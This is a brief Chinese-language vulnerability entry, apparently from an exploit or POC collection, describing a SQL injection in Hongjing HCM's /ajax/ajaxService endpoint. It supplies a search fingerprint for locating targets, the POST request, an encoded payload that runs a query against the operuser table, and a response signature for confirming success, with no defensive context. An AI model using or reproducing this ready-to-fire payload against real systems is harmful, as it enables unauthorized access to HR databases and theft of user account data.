# 宏景HCM-SQL注入-ajaxService

宏景HCM ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="947874108"`
- **请求**：`POST /ajax/ajaxService HTTP/1.1`

**Payload**
```
__type=extTrans&__xml={"functionId":"151211001137","sql":"select~20111*111~20a~30~31~30~30~2c~31~20a~30~31~30~31~2c~31~20b~30~31~31~30~2c~31~20e~30~31~32~32~2c~31~20e~30~31a~31~2c~31~20dbase~2c~31~20a~30~30~30~30~20from~20operuser","nbase":"1"}
```
- **响应特征**：200 12321